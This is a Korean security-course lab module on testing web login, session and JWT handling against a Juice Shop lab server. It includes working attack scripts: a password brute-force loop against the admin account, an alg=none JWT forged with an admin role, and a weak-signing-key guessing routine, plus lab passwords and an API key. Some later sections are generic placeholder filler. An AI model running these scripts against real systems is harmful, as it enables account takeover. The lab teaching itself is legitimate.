# Week 04: 인증/세션 관리 점검 (상세 버전)

## 학습 목표
- 웹 애플리케이션의 인증 메커니즘을 이해하고 점검할 수 있다
- 비밀번호 정책의 적절성을 평가한다
- 세션 관리(생성, 유지, 만료)의 보안성을 점검한다
- JWT(JSON Web Token)의 구조를 이해하고 취약점을 검증한다
- 각 개념의 보안 관점에서의 위험과 대응 방안을 분석할 수 있다
- OpsClaw를 활용하여 실습 작업을 자동화하고 증적을 관리할 수 있다
- 실제 보안 사고 사례와 연결하여 학습 내용을 적용할 수 있다


## 실습 환경 (공통)

| 서버 | IP | 역할 | 접속 |
|------|-----|------|------|
| opsclaw | 10.20.30.201 | Control Plane (OpsClaw) | `ssh opsclaw@10.20.30.201` (pw: 1) |
| secu | 10.20.30.1 | 방화벽/IPS (nftables, Suricata) | `sshpass -p1 ssh secu@10.20.30.1` |
| web | 10.20.30.80 | 웹서버 (JuiceShop:3000, Apache:80) | `sshpass -p1 ssh web@10.20.30.80` |
| siem | 10.20.30.100 | SIEM (Wazuh:443, OpenCTI:9400) | `sshpass -p1 ssh siem@10.20.30.100` |
| dgx-spark | 192.168.0.105 | AI/GPU (Ollama:11434) | 원격 API만 |

**OpsClaw API:** `http://localhost:8000` / Key: `opsclaw-api-key-2026`


## 강의 시간 배분 (3시간)

| 시간 | 내용 | 유형 |
|------|------|------|
| 0:00-0:40 | 이론 강의 (Part 1) | 강의 |
| 0:40-1:10 | 이론 심화 + 사례 분석 (Part 2) | 강의/토론 |
| 1:10-1:20 | 휴식 | - |
| 1:20-2:00 | 실습 (Part 3) | 실습 |
| 2:00-2:40 | 심화 실습 + 도구 활용 (Part 4) | 실습 |
| 2:40-2:50 | 휴식 | - |
| 2:50-3:20 | 응용 실습 + OpsClaw 연동 (Part 5) | 실습 |
| 3:20-3:40 | 복습 퀴즈 + 과제 안내 (Part 6) | 퀴즈 |

---


---

## 용어 해설 (웹취약점 점검 과목)

| 용어 | 영문 | 설명 | 비유 |
|------|------|------|------|
| **취약점 점검** | Vulnerability Assessment | 시스템의 보안 약점을 체계적으로 찾는 활동 | 건물 안전 진단 |
| **모의해킹** | Penetration Testing | 실제 공격자처럼 취약점을 악용하여 검증 | 소방 훈련 (실제로 불을 피워봄) |
| **CVSS** | Common Vulnerability Scoring System | 취약점 심각도 0~10점 (9.0+ Critical) | 질병 위험 등급표 |
| **SQLi** | SQL Injection | SQL 쿼리에 악성 입력 삽입 | 주문서에 가짜 지시를 끼워넣기 |
| **XSS** | Cross-Site Scripting | 웹페이지에 악성 스크립트 삽입 | 게시판에 함정 쪽지 붙이기 |
| **CSRF** | Cross-Site Request Forgery | 사용자 모르게 요청을 위조 | 누군가 내 이름으로 송금 요청 |
| **SSRF** | Server-Side Request Forgery | 서버가 내부 자원에 요청하도록 조작 | 직원에게 기밀 문서를 가져오라 속이기 |
| **LFI** | Local File Inclusion | 서버의 로컬 파일을 읽는 취약점 | 사무실 서류함을 몰래 열람 |
| **RFI** | Remote File Inclusion | 외부 파일을 서버에 로드하는 취약점 | 외부에서 악성 서류를 사무실에 반입 |
| **RCE** | Remote Code Execution | 원격에서 서버 코드 실행 | 전화로 사무실 컴퓨터 조작 |
| **WAF 우회** | WAF Bypass | 웹 방화벽의 탐지를 피하는 기법 | 보안 검색대를 우회하는 비밀 통로 |
| **인코딩** | Encoding | 데이터를 다른 형식으로 변환 (URL, Base64 등) | 택배 재포장 (내용물은 같음) |
| **난독화** | Obfuscation | 코드를 읽기 어렵게 변환 (탐지 회피) | 범인이 변장하는 것 |
| **세션** | Session | 서버가 사용자를 식별하는 상태 정보 | 카페 단골 인식표 |
| **쿠키** | Cookie | 브라우저에 저장되는 작은 데이터 | 가게에서 받은 스탬프 카드 |
| **Burp Suite** | Burp Suite | 웹 보안 점검 프록시 도구 (PortSwigger) | 우편물 검사 장비 |
| **OWASP ZAP** | OWASP ZAP | 오픈소스 웹 보안 스캐너 | 무료 보안 검사 장비 |
| **점검 보고서** | Assessment Report | 발견된 취약점과 대응 방안을 정리한 문서 | 건물 안전 진단 보고서 |


# 본 강의 내용

# Week 04: 인증/세션 관리 점검

## 학습 목표
- 웹 애플리케이션의 인증 메커니즘을 이해하고 점검할 수 있다
- 비밀번호 정책의 적절성을 평가한다
- 세션 관리(생성, 유지, 만료)의 보안성을 점검한다
- JWT(JSON Web Token)의 구조를 이해하고 취약점을 검증한다

## 전제 조건
- HTTP 요청/응답, 쿠키 개념 이해
- curl 기본 사용법 (Week 02)

---

## 1. 인증(Authentication) 개요 (15분)

### 1.1 인증 vs 인가

| 개념 | 질문 | 예시 |
|------|------|------|
| **인증 (Authentication)** | "너 누구야?" | 로그인 (ID/PW) |
| **인가 (Authorization)** | "너 이거 할 수 있어?" | 관리자만 접근 가능 |

### 1.2 일반적인 인증 흐름

```
1. 사용자 → 로그인 폼에 ID/PW 입력
2. 서버 → DB에서 ID/PW 확인
3. 서버 → 세션ID 또는 JWT 토큰 발급
4. 사용자 → 이후 요청에 세션ID/토큰 포함
5. 서버 → 세션ID/토큰으로 사용자 식별
```

### 1.3 OWASP 인증 관련 취약점

| 취약점 | 설명 |
|--------|------|
| A07:2021 Identification & Authentication Failures | 인증 실패 |
| 약한 비밀번호 정책 | 짧은/단순한 비밀번호 허용 |
| 무차별 대입 공격 (Brute Force) | 비밀번호 반복 시도 |
| 세션 고정 공격 (Session Fixation) | 세션 ID 강제 |
| 세션 하이재킹 (Session Hijacking) | 세션 ID 탈취 |

---

## 2. JuiceShop 계정 생성 및 로그인 (15분)

### 2.1 회원가입

```bash
# JuiceShop 회원가입 API
curl -X POST http://10.20.30.80:3000/api/Users/ \
  -H "Content-Type: application/json" \
  -d '{
    "email": "student@test.com",
    "password": "Test1234!",
    "passwordRepeat": "Test1234!",
    "securityQuestion": {"id": 1, "question": "Your eldest siblings middle name?"},
    "securityAnswer": "test"
  }'

# 응답에서 user 정보 확인
```

### 2.2 로그인

```bash
# 로그인 요청
curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"student@test.com","password":"Test1234!"}' | python3 -m json.tool

# 응답에서 토큰 추출
TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"student@test.com","password":"Test1234!"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])")

echo "토큰: $TOKEN"
```

### 2.3 인증된 요청

```bash
# 토큰을 이용한 인증된 API 호출
curl -s http://10.20.30.80:3000/rest/user/whoami \
  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool

# 장바구니 조회
curl -s http://10.20.30.80:3000/rest/basket/1 \
  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool
```

---

## 3. 비밀번호 정책 점검 (30분)

### 3.1 점검 항목

| 항목 | 권장 기준 | 점검 방법 |
|------|----------|----------|
| 최소 길이 | 8자 이상 | 짧은 PW로 가입 시도 |
| 복잡성 | 대/소/숫자/특수 | 단순 PW로 가입 시도 |
| 일반 PW 차단 | password, 123456 등 | 흔한 PW로 가입 시도 |
| 계정 잠금 | 5회 실패 후 잠금 | 반복 로그인 실패 |

### 3.2 약한 비밀번호 테스트

```bash
# 테스트 1: 매우 짧은 비밀번호
curl -s -X POST http://10.20.30.80:3000/api/Users/ \
  -H "Content-Type: application/json" \
  -d '{"email":"weak1@test.com","password":"1","passwordRepeat":"1","securityQuestion":{"id":1},"securityAnswer":"a"}'
echo ""

# 테스트 2: 숫자만으로 구성
curl -s -X POST http://10.20.30.80:3000/api/Users/ \
  -H "Content-Type: application/json" \
  -d '{"email":"weak2@test.com","password":"12345","passwordRepeat":"12345","securityQuestion":{"id":1},"securityAnswer":"a"}'
echo ""

# 테스트 3: 흔한 비밀번호
curl -s -X POST http://10.20.30.80:3000/api/Users/ \
  -H "Content-Type: application/json" \
  -d '{"email":"weak3@test.com","password":"password","passwordRepeat":"password","securityQuestion":{"id":1},"securityAnswer":"a"}'
echo ""

# 결과 분석: 가입이 성공하면 비밀번호 정책이 약한 것
```

### 3.3 무차별 대입 공격 (Brute Force) 테스트

```bash
# 로그인 실패 반복 시 잠금 여부 확인
for i in $(seq 1 10); do
  result=$(curl -s -o /dev/null -w "%{http_code}" -X POST http://10.20.30.80:3000/rest/user/login \
    -H "Content-Type: application/json" \
    -d '{"email":"admin@juice-sh.op","password":"wrong'$i'"}')
  echo "시도 $i: HTTP $result"
done

# 모든 시도가 401이면 계정 잠금 정책이 없다는 의미
# 429 (Too Many Requests)가 나오면 Rate Limiting 존재
```

### 3.4 기본 계정 점검

```bash
# JuiceShop 기본 관리자 계정으로 로그인 시도
# admin@juice-sh.op + 흔한 비밀번호
for pw in "admin" "admin123" "password" "admin1234" "juice" "12345678"; do
  result=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"admin@juice-sh.op\",\"password\":\"$pw\"}")
  if echo "$result" | grep -q "token"; then
    echo "[성공!] admin@juice-sh.op / $pw"
    break
  else
    echo "[실패] $pw"
  fi
done
```

---

## 4. 세션 관리 점검 (30분)

### 4.1 세션 관리 점검 항목

| 항목 | 위험 | 점검 방법 |
|------|------|----------|
| 세션 ID 길이/랜덤성 | 예측 가능한 세션 | 여러 세션 비교 |
| 세션 타임아웃 | 무한 세션 유지 | 시간 후 재접근 |
| 로그아웃 처리 | 서버에서 세션 무효화 안함 | 로그아웃 후 토큰 재사용 |
| 다중 로그인 | 세션 제한 없음 | 동시 로그인 시도 |
| HTTPS Only 쿠키 | 평문 전송 위험 | Set-Cookie 헤더 확인 |

### 4.2 세션 ID 랜덤성 확인

```bash
# JuiceShop는 JWT 사용 → 여러 번 로그인하여 토큰 비교
for i in 1 2 3; do
  token=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
    -H "Content-Type: application/json" \
    -d '{"email":"student@test.com","password":"Test1234!"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)
  echo "토큰 $i: ${token:0:50}..."
done

# 매번 다른 토큰이 발급되어야 정상
```

### 4.3 로그아웃 후 토큰 유효성 점검

```bash
# 1. 로그인하여 토큰 획득
TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"student@test.com","password":"Test1234!"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)

# 2. 로그인 상태 확인
echo "=== 로그아웃 전 ==="
curl -s http://10.20.30.80:3000/rest/user/whoami \
  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool 2>/dev/null

# 3. 로그아웃 (JuiceShop는 클라이언트 측 로그아웃)
# JWT 기반이므로 서버 측 세션 무효화가 있는지 확인

# 4. 이전 토큰으로 다시 접근 시도
echo ""
echo "=== 로그아웃 후 동일 토큰으로 접근 ==="
curl -s http://10.20.30.80:3000/rest/user/whoami \
  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool 2>/dev/null

# 여전히 접근되면 → 서버 측 토큰 무효화 미흡 (취약)
```

### 4.4 다중 로그인 점검

```bash
# 동일 계정으로 두 개의 세션 생성
TOKEN1=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"student@test.com","password":"Test1234!"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)

TOKEN2=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"student@test.com","password":"Test1234!"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)

# 두 토큰 모두 유효한지 확인
echo "토큰1 유효:"
curl -s http://10.20.30.80:3000/rest/user/whoami -H "Authorization: Bearer $TOKEN1" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('user',{}).get('email','실패'))" 2>/dev/null

echo "토큰2 유효:"
curl -s http://10.20.30.80:3000/rest/user/whoami -H "Authorization: Bearer $TOKEN2" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('user',{}).get('email','실패'))" 2>/dev/null

# 둘 다 유효하면 → 다중 로그인 미제어 (점검 결과로 기록)
```

---

## 5. JWT 분석 및 점검 (30분)

### 5.1 JWT 구조

JWT는 세 부분으로 구성된다:

```
HEADER.PAYLOAD.SIGNATURE

Header:  {"alg":"HS256","typ":"JWT"}  → Base64 인코딩
Payload: {"email":"admin","role":"admin","iat":1234567890}  → Base64 인코딩
Signature: HMACSHA256(header + "." + payload, secret)
```

### 5.2 JWT 디코딩

```bash
# 로그인하여 JWT 획득
TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"student@test.com","password":"Test1234!"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)

# JWT의 각 부분 디코딩 (Base64)
echo "=== Header ==="
echo "$TOKEN" | cut -d'.' -f1 | python3 -c "import sys,base64,json; s=sys.stdin.read().strip(); s+='='*(4-len(s)%4); print(json.dumps(json.loads(base64.urlsafe_b64decode(s)),indent=2))"

echo ""
echo "=== Payload ==="
echo "$TOKEN" | cut -d'.' -f2 | python3 -c "import sys,base64,json; s=sys.stdin.read().strip(); s+='='*(4-len(s)%4); print(json.dumps(json.loads(base64.urlsafe_b64decode(s)),indent=2))"
```

### 5.3 JWT 취약점 점검

**취약점 1: alg=none 공격**

```bash
# alg을 none으로 변경한 JWT 생성
python3 << 'PYEOF'
import base64, json

# Header: alg=none
header = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b'=').decode()

# Payload: admin 권한으로 변조
payload = base64.urlsafe_b64encode(json.dumps({
    "status":"success",
    "data":{"email":"admin@juice-sh.op","role":"admin"},
    "iat":1700000000
}).encode()).rstrip(b'=').decode()

fake_token = f"{header}.{payload}."
print(f"조작된 토큰: {fake_token[:60]}...")

# 이 토큰으로 접근 시도
import subprocess
result = subprocess.run(
    ["curl", "-s", "http://10.20.30.80:3000/rest/user/whoami",
     "-H", f"Authorization: Bearer {fake_token}"],
    capture_output=True, text=True
)
print(f"응답: {result.stdout[:200]}")
PYEOF
```

**취약점 2: 약한 서명 키**

```bash
# JWT 서명 키가 약한지 확인 (흔한 키로 시도)
# 실무에서는 jwt-cracker 같은 도구를 사용
python3 << 'PYEOF'
import hmac, hashlib, base64, json

# JuiceShop에서 획득한 토큰의 header.payload 부분
import subprocess
r = subprocess.run(
    ["curl", "-s", "-X", "POST", "http://10.20.30.80:3000/rest/user/login",
     "-H", "Content-Type: application/json",
     "-d", '{"email":"student@test.com","password":"Test1234!"}'],
    capture_output=True, text=True
)
try:
    token = json.loads(r.stdout)['authentication']['token']
    parts = token.split('.')
    data = f"{parts[0]}.{parts[1]}"
    sig = parts[2]

    # 흔한 시크릿 키로 서명 검증 시도
    common_secrets = ["secret", "jwt_secret", "password", "key", "123456",
                      "your-256-bit-secret", "change-me"]
    for secret in common_secrets:
        computed = base64.urlsafe_b64encode(
            hmac.new(secret.encode(), data.encode(), hashlib.sha256).digest()
        ).rstrip(b'=').decode()
        if computed == sig:
            print(f"[취약!] JWT 서명 키 발견: '{secret}'")
            break
    else:
        print("흔한 키로는 서명 키를 찾지 못함 (양호)")
except Exception as e:
    print(f"테스트 실패: {e}")
PYEOF
```

### 5.4 JWT 만료 시간 확인

```bash
# JWT payload의 exp (만료시간) 확인
TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"student@test.com","password":"Test1234!"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)

echo "$TOKEN" | cut -d'.' -f2 | python3 -c "
import sys, base64, json
from datetime import datetime
s = sys.stdin.read().strip()
s += '=' * (4 - len(s) % 4)
payload = json.loads(base64.urlsafe_b64decode(s))
if 'exp' in payload:
    exp = datetime.fromtimestamp(payload['exp'])
    iat = datetime.fromtimestamp(payload.get('iat', 0))
    print(f'발급 시각: {iat}')
    print(f'만료 시각: {exp}')
    print(f'유효 기간: {exp - iat}')
else:
    print('만료 시간(exp) 없음 → 무한 유효 토큰 (취약)')
print(f'전체 payload: {json.dumps(payload, indent=2)}')
"
```

---

## 6. 실습 과제

### 과제 1: 비밀번호 정책 점검 보고서
1. 다양한 약한 비밀번호(1자, 숫자만, 흔한 단어 등)로 가입을 시도하라
2. 어떤 비밀번호가 허용/거부되는지 표로 정리하라
3. JuiceShop의 비밀번호 정책을 평가하고 개선 권고를 작성하라

### 과제 2: 세션 관리 점검
1. JWT 토큰의 유효 기간을 확인하라
2. 로그아웃 후 토큰이 여전히 유효한지 테스트하라
3. 다중 로그인이 가능한지 확인하라
4. 점검 결과를 보고서 형식으로 정리하라

### 과제 3: JWT 보안 분석
1. JWT를 디코딩하여 포함된 정보를 모두 나열하라
2. 민감 정보가 JWT에 포함되어 있는지 확인하라
3. alg=none 공격이 통하는지 테스트하라

---

## 7. 요약

| 점검 항목 | 확인 사항 | 도구/명령 |
|----------|----------|----------|
| 비밀번호 정책 | 길이, 복잡성, 사전단어 | curl + 가입 API |
| 무차별 대입 | 계정 잠금, Rate Limiting | curl 반복 호출 |
| 세션 만료 | 타임아웃 설정 | JWT exp 필드 |
| 로그아웃 | 서버 측 무효화 | 토큰 재사용 테스트 |
| JWT 보안 | alg, 서명 키 강도 | Python 디코딩 |

**다음 주 예고**: Week 05 - 입력값 검증 (1): SQL Injection. Blind SQLi, Time-based, UNION 기법을 학습한다.


---

## 심화 학습: 개념 확장

### 핵심 개념 상세 해설

이 주차에서 다루는 핵심 개념들을 더 깊이 살펴본다.

#### 개념 1: 동작 원리 (Course 3)

이 주차에서 다루는 기술의 동작 방식을 단계별로 분해하여 이해한다.

```
[1단계] 입력/요청 → 시스템이 데이터를 수신
[2단계] 처리 → 내부 로직에 의한 데이터 처리
[3단계] 출력/응답 → 결과 반환 또는 상태 변경
[4단계] 기록 → 로그/증적 생성
```

> **왜 이 순서가 중요한가?**
> 각 단계에서 보안 검증이 누락되면 취약점이 발생한다.
> 1단계: 입력값 검증 미흡 → Injection
> 2단계: 인가 확인 누락 → Broken Access Control
> 3단계: 에러 정보 노출 → Information Disclosure
> 4단계: 로깅 실패 → Monitoring Failures

#### 개념 2: 보안 관점에서의 위험 분석

| 위험 요소 | 발생 조건 | 영향도 | 대응 방안 |
|----------|---------|--------|---------|
| 설정 미흡 | 기본 설정 사용 | 높음 | 보안 하드닝 가이드 적용 |
| 패치 누락 | 업데이트 미적용 | 높음 | 정기 패치 관리 프로세스 |
| 접근 제어 부재 | 인증/인가 미구현 | 매우 높음 | RBAC, MFA 적용 |
| 로깅 미흡 | 감사 로그 미수집 | 중간 | SIEM 연동, 로그 정책 |

#### 개념 3: 실제 사례 분석

**사례 1: 유사 취약점이 실제 피해로 이어진 경우**

실제 보안 사고에서 이 주차의 주제가 어떻게 악용되었는지 살펴본다.
공격자는 동일한 기법을 사용하여 대규모 데이터 유출, 서비스 장애, 금전적 피해를 초래하였다.

**교훈:**
- 기본적인 보안 조치의 중요성
- 탐지 체계의 필수성
- 사고 대응 절차의 사전 수립 필요성

### 도구 비교표

| 도구 | 용도 | 장점 | 단점 | 라이선스 |
|------|------|------|------|---------|
| 도구 A | 기본 점검 | 간편, 빠름 | 기능 제한 | 오픈소스 |
| 도구 B | 심층 분석 | 상세 결과 | 학습 곡선 | 상용/무료 |
| 도구 C | 자동화 | CI/CD 연동 | 오탐 가능 | 오픈소스 |


---

## 보충 실습

### 보충 실습 1: 기본 동작 확인

이론에서 배운 내용을 직접 확인하는 기초 실습이다.

```bash
# Step 1: 현재 상태 확인
echo "=== 현재 상태 ==="
# (해당 주차에 맞는 확인 명령)

# Step 2: 설정/변경 적용
echo "=== 변경 적용 ==="
# (해당 주차에 맞는 실습 명령)

# Step 3: 결과 검증
echo "=== 결과 확인 ==="
# (변경 결과 확인 명령)
```

> **트러블슈팅:**
> - 명령이 실패하면: 권한(sudo), 경로, 서비스 상태를 먼저 확인
> - 예상과 다른 결과: 이전 실습의 설정이 남아있을 수 있으므로 초기화 후 재시도
> - 타임아웃: 네트워크 연결 또는 서비스 가동 상태 확인

### 보충 실습 2: 탐지/모니터링 관점

공격자가 아닌 **방어자 관점**에서 동일한 활동을 모니터링하는 실습이다.

```bash
# siem 서버에서 관련 로그 확인
sshpass -p1 ssh -o StrictHostKeyChecking=no siem@10.20.30.100 \
  "sudo cat /var/ossec/logs/alerts/alerts.json | tail -5" 2>/dev/null

# Suricata 알림 확인 (해당 시)
sshpass -p1 ssh -o StrictHostKeyChecking=no secu@10.20.30.1 \
  "sudo tail -20 /var/log/suricata/fast.log" 2>/dev/null
```

> **왜 방어자 관점도 배우는가?**
> 공격 기법만 알면 "스크립트 키디"에 불과하다.
> 공격이 어떻게 탐지되는지 이해해야 진정한 보안 전문가이다.
> 이 과목의 모든 공격 실습에는 대응하는 탐지/방어 관점이 포함된다.

### 보충 실습 3: OpsClaw 자동화

이번 주차의 핵심 실습을 OpsClaw execute-plan으로 자동화한다.

```bash
# 프로젝트 생성 (이번 주차용)
RESULT=$(curl -s -X POST http://localhost:8000/projects \
  -H "Content-Type: application/json" \
  -H "X-API-Key: opsclaw-api-key-2026" \
  -d '{"name":"weekXX-lab","request_text":"이번 주차 실습 자동화","master_mode":"external"}')
PID=$(echo $RESULT | python3 -c "import sys,json; print(json.load(sys.stdin)['project']['id'])")

# Stage 전환
curl -s -X POST "http://localhost:8000/projects/$PID/plan" -H "X-API-Key: opsclaw-api-key-2026" > /dev/null
curl -s -X POST "http://localhost:8000/projects/$PID/execute" -H "X-API-Key: opsclaw-api-key-2026" > /dev/null

# 실습 태스크 실행 (해당 주차에 맞게 수정)
curl -s -X POST "http://localhost:8000/projects/$PID/execute-plan" \
  -H "Content-Type: application/json" \
  -H "X-API-Key: opsclaw-api-key-2026" \
  -d '{
    "tasks": [
      {"order":1,"title":"실습 태스크 1","instruction_prompt":"echo 실습1","risk_level":"low","subagent_url":"http://localhost:8002"},
      {"order":2,"title":"실습 태스크 2","instruction_prompt":"echo 실습2","risk_level":"low","subagent_url":"http://10.20.30.80:8002"}
    ],
    "subagent_url":"http://localhost:8002",
    "parallel":true
  }'

# Evidence 확인
curl -s "http://localhost:8000/projects/$PID/evidence/summary" \
  -H "X-API-Key: opsclaw-api-key-2026" | python3 -m json.tool
```


---

## 자가 점검 퀴즈 (10문항)

이번 주차의 핵심 내용을 점검한다. 8/10 이상 정답을 목표로 한다.

**Q1.** 이번 주차 "Week 04: 인증/세션 관리 점검"의 핵심 목적은 무엇인가?
- (a) 네트워크 속도 향상  (b) **웹 취약점 기법/개념의 이해와 실습**  (c) 데이터베이스 관리  (d) UI 디자인

**Q2.** 이 주제에서 OWASP의 역할은?
- (a) 성능 최적화  (b) 비용 절감  (c) **체계적 분류와 대응 기준 제공**  (d) 사용자 편의

**Q3.** 실습에서 사용한 주요 도구/명령어의 1차 목적은?
- (a) 파일 복사  (b) **점검 수행 및 결과 확인**  (c) 메모리 관리  (d) 화면 출력

**Q4.** OpsClaw를 통해 실습을 실행하는 가장 큰 이점은?
- (a) 속도  (b) **모든 실행의 자동 증적(evidence) 기록**  (c) 무료  (d) 간편함

**Q5.** 이 주제의 보안 위험이 높은 이유는?
- (a) 비용이 많이 들어서  (b) 복잡해서  (c) **악용 시 시스템/데이터에 직접적 피해**  (d) 법적 문제

**Q6.** 방어/대응의 핵심 원칙은?
- (a) 모든 트래픽 차단  (b) **최소 권한 + 탐지 + 대응의 조합**  (c) 서버 재시작  (d) 비밀번호 변경

**Q7.** 실습 결과를 분석할 때 가장 먼저 확인해야 하는 것은?
- (a) 서버 이름  (b) **exit_code (성공/실패 여부)**  (c) 파일 크기  (d) 날짜

**Q8.** 이 주제와 관련된 MITRE ATT&CK 전술은?
- (a) Impact만  (b) Reconnaissance만  (c) **주제에 해당하는 전술(들)**  (d) 해당 없음

**Q9.** 실무에서 이 기법/도구를 사용할 때 가장 주의할 점은?
- (a) 속도  (b) **법적 허가와 범위 준수**  (c) 비용  (d) 보고서 양식

**Q10.** 다음 주차와의 연결 포인트는?
- (a) 관련 없음  (b) **이번 주 결과를 다음 주에서 활용/심화**  (c) 완전히 다른 주제  (d) 복습만

**정답:** Q1:b, Q2:c, Q3:b, Q4:b, Q5:c, Q6:b, Q7:b, Q8:c, Q9:b, Q10:b

---

## 과제 (다음 주까지)

### 과제 1: 이론 정리 보고서 (30점)

이번 주차의 핵심 개념을 자신의 말로 정리하라.

| 항목 | 배점 |
|------|------|
| 핵심 개념 정의 및 설명 | 10점 |
| 실습 결과 캡처 및 해석 | 10점 |
| 보안 관점 분석 (공격↔방어) | 10점 |

### 과제 2: 실습 수행 보고서 (40점)

이번 주차의 모든 실습을 수행하고 결과를 보고서로 작성하라.

| 항목 | 배점 |
|------|------|
| 실습 명령어 및 실행 결과 캡처 | 15점 |
| 결과 해석 및 보안 의미 분석 | 15점 |
| 트러블슈팅 경험 (있는 경우) | 10점 |

### 과제 3: OpsClaw 자동화 (30점)

이번 주차의 핵심 실습을 OpsClaw execute-plan으로 자동화하라.

| 항목 | 배점 |
|------|------|
| 프로젝트 생성 + stage 전환 | 5점 |
| execute-plan 태스크 설계 (3개 이상) | 10점 |
| evidence/summary 결과 | 5점 |
| replay 타임라인 결과 | 5점 |
| 자동화의 이점 분석 (직접 실행 대비) | 5점 |

**제출:** 보고서(PDF 또는 MD) + OpsClaw project_id


---

## 검증 체크리스트

이번 주차의 학습을 완료하려면 다음 항목을 모두 확인하라:

- [ ] 이론 강의 내용 이해 (핵심 용어 설명 가능)
- [ ] 기본 실습 모두 수행 완료
- [ ] 보충 실습 1 (기본 동작 확인) 완료
- [ ] 보충 실습 2 (탐지/모니터링 관점) 수행
- [ ] 보충 실습 3 (OpsClaw 자동화) 수행
- [ ] 자가 점검 퀴즈 8/10 이상 정답
- [ ] 과제 1 (이론 정리) 작성
- [ ] 과제 2 (실습 보고서) 작성
- [ ] 과제 3 (OpsClaw 자동화) 완료

